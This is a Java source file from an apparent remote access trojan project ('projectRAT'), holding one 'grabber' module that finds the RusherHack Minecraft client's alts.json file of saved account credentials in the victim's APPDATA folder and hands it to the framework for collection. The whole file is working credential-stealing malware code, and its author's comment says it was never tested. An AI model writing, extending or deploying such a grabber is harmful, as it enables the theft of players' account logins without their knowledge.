package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import java.io.File;

/**
 I dont have rusher either so idk if this works or not, i didnt test it
 @author yoink and momin
 */
public class RHack implements Request {
    File file;

    @Override
    public void init() throws Exception {
        file = new File(System.getenv("APPDATA") + "/.minecraft/rusherhack/alts.json");
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        if(file.exists())
            return new File[]{
                    file
            };

        return null;
    }
}
